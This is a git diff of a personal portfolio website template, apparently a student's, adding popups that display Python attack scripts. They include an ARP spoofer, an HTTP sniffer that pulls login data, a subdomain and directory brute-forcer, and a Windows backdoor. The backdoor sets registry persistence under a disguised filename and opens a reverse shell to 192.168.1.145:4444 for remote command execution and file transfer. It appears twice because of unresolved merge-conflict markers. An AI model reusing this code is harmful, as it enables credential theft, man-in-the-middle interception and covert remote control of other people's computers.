+            packet = scapyA.ARP(op=2, pdst=dest_IP, hwdst=dest_MAC, psrc=source_IP, hwsrc=source_MAC)
+            scapy.send(packet, count=4, verbose=False)
+
+
+        def get_mac(target_IP):
+            arp_req = scapyA.ARP(pdst=target_IP)
+            broadcast = scapyA.Ether(dst="ff:ff:ff:ff:ff:ff")
+            arp_broadcast_req = broadcast/arp_req
+            answer = scapyA.srp(arp_broadcast_req, timeout=1, verbose=False)[0]
+
+            for e in answer:
+                  mac = e[1].hwsrc
+                  return mac
+
+        target_IP = "192.168.46.129"
+        gateway_IP = "192.168.46.2"
+
+        sent_packets = 0
+        try:
+            while True:
+                spoof(target_IP, gateway_IP)
+                spoof(gateway_IP, target_IP)
+                sent_packets = sent_packets + 2
+                print("\r[+] Packets sent: " + str(sent_packets), end="")
+                sys.stdout.flush()
+                time.sleep(2)
+        except KeyboardInterrupt:
+            print("\n Ctrl + C pressed, Resetting ARP Table, please wait...")
+            restore(target_IP, gateway_IP)
+            restore(gateway_IP, target_IP)
+
+
+      </pre>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popup4">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup4">&times;</span>
+      <pre id="popup2Content">
+
+        <--------------------------------- PACKET SNIFFER ------------------------------------>
+
+
+        #! usr/bin/env python
+        import scapy.all as scapy
+        from scapy.layers import http
+        import scapy.utils as scapyU
+
+        def sniff(interface):
+            scapy.sniff(iface=interface, store=False, prn=sniff_packet)
+
+        def get_url(packet):
+            url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+            return url
+
+        def get_login_info(packet):
+            if packet.haslayer(scapy.Raw):
+                keywords = ["User", "Username", "Password", "Login", "login", "un", "pass"]
+                load = str(packet[scapy.Raw].load)
+                for keyword in keywords:
+                    if keyword in load:
+                        return load
+
+        def sniff_packet(packet):
+
+            if packet.haslayer(http.HTTPRequest):
+                url = get_url(packet)
+                login_info = get_login_info(packet)
+                print("[+] HTTP Request >>" + str(url))
+                print("Possible Login Information: " + str(login_info))
+
+        sniff("eth0")
+
+      </pre>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popup5">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup5">&times;</span>
+      <pre id="popup2Content">
+
+        <--------------------------------- WEBSITE CRAWLER ------------------------------------>
+
+
+        #!usr/bin/python/env
+        import requests, urllib.parse, re
+
+        def get_response(url):
+            try:
+                req = requests.get(url)
+                if req.status_code == requests.codes.ok:
+                    print(requests.get(url))
+                    return req
+            except requests.exceptions.ConnectionError:
+                pass
+
+        url = "hackthissite.org"
+        with open ("subdomains.txt", "r") as wordlist:
+            for word in wordlist:
+                word = word.strip()
+                test_url = "http://" + word + "." + url
+                result = get_response(test_url)
+                if result:
+                    print("[+] Discovered subdomain --> " + test_url)
+
+        dir_url = "192.168.46.128"
+        with open ("files-and-dirs.txt", "r") as wordlist:
+            for word in wordlist:
+                word = word.strip()
+                test_url = "http://" + dir_url + "/" + word
+                # print(test_url)
+                result = get_response(test_url)
+
+                if result:
+                    print("[+] Discovered subdirectory --> " + test_url)
+
+
+        url = "https://carzone-p58h.onrender.com"
+        link_list = []
+        def get_href_links(url):
+            content = requests.get(url)
+            links = re.findall('(?:href=")(.*?)"', str(content.content))
+            return links
+
+        def crawl(url):
+            links = get_href_links(url)
+            for link in links:
+                link = urllib.parse.urljoin(url, link)
+                if "#" in link:
+                    link = link.split("#")[0]
+                if url in link and link not in link_list:
+                    link_list.append(link)
+                    print(link)
+                    crawl(link)
+
+        crawl(url)
+
+      </pre>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popup6">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup6">&times;</span>
+      <pre id="popup2Content">
+        # -*- coding: utf-8 -*-
+
+        import socket
+        import subprocess
+        import re, json
+        import os
+        import base64
+        import sys
+        import shutil
+
+        class Backdoor:
+            def __init__(self, ip, port):
+                self.persist_exec()
+                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.connection.connect((ip, port))
+                # connection.send(b"\nConnected\n")
+
+            def persist_exec(self):
+                file_loc = os.environ["Appdata"] + "\\winload64.exe"
+                if not os.path.exists(file_loc):
+                    shutil.copyfile(sys.executable, file_loc)
+                    subprocess.call("reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d '"+ file_loc +"'")
+                    print("REGEDIT SUCCESSFUL")
+
+            def execute_command(self, command):
+                command_result =  command_result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+                return (command_result.decode('utf-8'))
+
+            def change_working_directory(self, path):
+                os.chdir(path)
+                return "[+] Changing working directory to '" + path +"'"
+
+            def write_file(self, path, content):
+                with open(path, "wb") as new_file:
+                    new_file.write(base64.b64decode(content))
+                    print("[+] Upload Successful.")
+
+
+            def read_file(self, path):
+                with open (path, "rb") as file:
+                    file_content = base64.b64encode(file.read())
+                    print(type(file_content))
+                    file_str = file_content.decode()
+                    # print(file_str)
+                    return file_str
+
+
+            def reliable_send(self, data):
+                json_data = json.dumps(data)
+                # json_data = json_data.decode('utf-8')
+                self.connection.send(bytes(json_data.encode()))
+
+
+            def reliable_recv(self):
+                json_data = b""
+                while True:
+                    try:
+                        json_data = json_data + self.connection.recv(1024)
+                        return json.loads(json_data)
+                    except ValueError:
+                        continue
+
+            def run(self):
+                while True:
+
+                    command = self.reliable_recv()
+                    try:
+                        res = ""
+                        for i in range(len(command)):
+
+                            if i == 0:
+                                res += str(command[i])
+                            else:
+                                res += " " + str(command[i])
+
+                        if command[0] == "exit":
+                            self.connection.close()
+                            sys.exit()
+                        elif command[0] == "cd" and len(command) > 1:
+                            print(command[1])
+                            command_result = self.change_working_directory(command[1])
+                        elif command[0] == "dl":
+                            command_result = self.read_file(command[1])
+                        elif command[0] == "ul":
+                            command_result = self.write_file(command[1], command[2])
+                            print("[+] File Created.")
+                        else:
+                            command_result = self.execute_command(str(res))
+                    except Exception:
+                        command_result = "[!] Error during command execution, please recheck!"
+                    # print("COMMANDDDDDDDDDDDDDDDDD" + (str(res[1])))
+                    # commandre = re.search("(?:b')(.*)", str(command))
+                    # commandd = commandre.group(1)
+                    # final_command = commandd.replace("'","")
+                    # final_command = commandd.replace('""','')
+                    # print(final_command)
+                    # self.connection.send(command_result)
+                    self.reliable_send(command_result)
+                    print(command_result)
+
+        # front_file = sys._MEIPASS + "\Vecteezy-License-Information.pdf"
+        # subprocess.Popen(front_file, shell=True)
+
+        try:
+            my_backdoor = Backdoor("192.168.1.145", 4444)
+            my_backdoor.run()
+
+        except Exception:
+            sys.exit()
+
+      </pre>
+    </div>
+  </div>
+<center>
+  <iframe id="iframe1" class="hover-iframe" src="https://www.youtube.com/embed/cvnzPCGGD" width ="1000px" height="800px"></iframe>
+  <iframe id="iframe2" class="hover-iframe" src="https://www.youtube.com/embed/pZyMxhDTi" width ="1000px" height="800px"></iframe>
+
+</div>
+</center>
+
+
+
+
+
+
+  </div>
+</div>
+</div>
+
+      </pre>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popup5">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup5">&times;</span>
+      <pre id="popup2Content">
+
+        <--------------------------------- WEBSITE CRAWLER ------------------------------------>
+
+
+        #!usr/bin/python/env
+        import requests, urllib.parse, re
+
+        def get_response(url):
+            try:
+                req = requests.get(url)
+                if req.status_code == requests.codes.ok:
+                    print(requests.get(url))
+                    return req
+            except requests.exceptions.ConnectionError:
+                pass
+
+        url = "hackthissite.org"
+        with open ("subdomains.txt", "r") as wordlist:
+            for word in wordlist:
+                word = word.strip()
+                test_url = "http://" + word + "." + url
+                result = get_response(test_url)
+                if result:
+                    print("[+] Discovered subdomain --> " + test_url)
+
+        dir_url = "192.168.46.128"
+        with open ("files-and-dirs.txt", "r") as wordlist:
+            for word in wordlist:
+                word = word.strip()
+                test_url = "http://" + dir_url + "/" + word
+                # print(test_url)
+                result = get_response(test_url)
+
+                if result:
+                    print("[+] Discovered subdirectory --> " + test_url)
+
+
+        url = "https://carzone-p58h.onrender.com"
+        link_list = []
+        def get_href_links(url):
+            content = requests.get(url)
+            links = re.findall('(?:href=")(.*?)"', str(content.content))
+            return links
+
+        def crawl(url):
+            links = get_href_links(url)
+            for link in links:
+                link = urllib.parse.urljoin(url, link)
+                if "#" in link:
+                    link = link.split("#")[0]
+                if url in link and link not in link_list:
+                    link_list.append(link)
+                    print(link)
+                    crawl(link)
+
+        crawl(url)
+
+      </pre>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popup6">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup6">&times;</span>
+      <pre id="popup2Content">
+=======
+>>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
+        # -*- coding: utf-8 -*-
+
+        import socket
+        import subprocess
+        import re, json
+        import os
+        import base64
+        import sys
+        import shutil
+
+        class Backdoor:
+            def __init__(self, ip, port):
+                self.persist_exec()
+                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.connection.connect((ip, port))
+                # connection.send(b"\nConnected\n")
+
+            def persist_exec(self):
+                file_loc = os.environ["Appdata"] + "\\winload64.exe"
+                if not os.path.exists(file_loc):
+                    shutil.copyfile(sys.executable, file_loc)
+                    subprocess.call("reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d '"+ file_loc +"'")
+                    print("REGEDIT SUCCESSFUL")
+
+            def execute_command(self, command):
+                command_result =  command_result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+                return (command_result.decode('utf-8'))
+
+            def change_working_directory(self, path):
+                os.chdir(path)
+                return "[+] Changing working directory to '" + path +"'"
+
+            def write_file(self, path, content):
+                with open(path, "wb") as new_file:
+                    new_file.write(base64.b64decode(content))
+                    print("[+] Upload Successful.")
+
+
+            def read_file(self, path):
+                with open (path, "rb") as file:
+                    file_content = base64.b64encode(file.read())
+                    print(type(file_content))
+                    file_str = file_content.decode()
+                    # print(file_str)
+                    return file_str
+
+
+            def reliable_send(self, data):
+                json_data = json.dumps(data)
+                # json_data = json_data.decode('utf-8')
+                self.connection.send(bytes(json_data.encode()))
+
+
+            def reliable_recv(self):
+                json_data = b""
+                while True:
+                    try:
+                        json_data = json_data + self.connection.recv(1024)
+                        return json.loads(json_data)
+                    except ValueError:
+                        continue
+
+            def run(self):
+                while True:
+
+                    command = self.reliable_recv()
+                    try:
+                        res = ""
+                        for i in range(len(command)):
+
+                            if i == 0:
+                                res += str(command[i])
+                            else:
+                                res += " " + str(command[i])
+
+                        if command[0] == "exit":
+                            self.connection.close()
+                            sys.exit()
+                        elif command[0] == "cd" and len(command) > 1:
+                            print(command[1])
+                            command_result = self.change_working_directory(command[1])
+                        elif command[0] == "dl":
+                            command_result = self.read_file(command[1])
+                        elif command[0] == "ul":
+                            command_result = self.write_file(command[1], command[2])
+                            print("[+] File Created.")
+                        else:
+                            command_result = self.execute_command(str(res))
+                    except Exception:
+                        command_result = "[!] Error during command execution, please recheck!"
+                    # print("COMMANDDDDDDDDDDDDDDDDD" + (str(res[1])))
+                    # commandre = re.search("(?:b')(.*)", str(command))
+                    # commandd = commandre.group(1)
+                    # final_command = commandd.replace("'","")
+                    # final_command = commandd.replace('""','')
+                    # print(final_command)
+                    # self.connection.send(command_result)
+                    self.reliable_send(command_result)
+                    print(command_result)
+
+        # front_file = sys._MEIPASS + "\Vecteezy-License-Information.pdf"
+        # subprocess.Popen(front_file, shell=True)
+
+        try:
+            my_backdoor = Backdoor("192.168.1.145", 4444)
+            my_backdoor.run()
+
+        except Exception:
+            sys.exit()
+
+      </pre>
+    </div>
+  </div>
+<center>
+  <iframe id="iframe1" class="hover-iframe" src="https://www.youtube.com/embed/cvnzPCGGD" width ="1000px" height="800px"></iframe>
+  <iframe id="iframe2" class="hover-iframe" src="https://www.youtube.com/embed/pZyMxhDTi" width ="1000px" height="800px"></iframe>
+
+</div>
+</center>
+
+
+
+
+
+
+  </div>
+</div>
+</div>
+
+
+
+
+
   </section><!-- End Portfolio Section -->
 
   <!-- ======= Contact Section ======= -->
@@ -575,7 +2268,7 @@
           <div class="info-box">
             <i class="bx bx-map"></i>
             <h3>My Address</h3>
-            <p>A108 Adam Street, New York, NY 535022</p>
+            <p>Liloan, Cebu</p>
           </div>
         </div>
 
@@ -596,15 +2289,15 @@
         <div class="col-md-6 mt-4 d-flex align-items-stretch">
           <div class="info-box">
             <i class="bx bx-envelope"></i>
-            <h3>Email Me</h3>
-            <p>contact@example.com</p>
+            <h3>Email mee</h3>
+            <p>jakevillamor222@gmail.com</p>
           </div>
         </div>
         <div class="col-md-6 mt-4 d-flex align-items-stretch">
           <div class="info-box">
             <i class="bx bx-phone-call"></i>
             <h3>Call Me</h3>
-            <p>+1 5589 55488 55</p>
+            <p>0991 718 6723</p>
           </div>
         </div>
       </div>
@@ -651,9 +2344,22 @@
   <script src="{% static 'jake_portfolio/assets/vendor/swiper/swiper-bundle.min.js' %}"></script>
   <script src="{% static 'jake_portfolio/assets/vendor/waypoints/noframework.waypoints.js' %}"></script>
   <script src="{% static 'jake_portfolio/assets/vendor/php-email-form/validate.js' %}"></script>
+  <script src="{% static 'jake_portfolio/assets/vendor/php-email-form/validate.js' %}"></script>
 
   <!-- Template Main JS File -->
   <script src="{% static 'jake_portfolio/assets/js/main.js' %}"></script>
+  <script src="{% static 'jake_portfolio/assets/js/py_scripts.js' %}"></script>
+  <script src="{% static 'jake_portfolio/assets/js/iframe.js' %}"></script>
+<<<<<<< HEAD
+<<<<<<< HEAD
+  <script src="{% static 'jake_portfolio/assets/js/portfolio_others.js' %}"></script>
+
+=======
+>>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
+=======
+>>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
+
+
 
 </body>
 
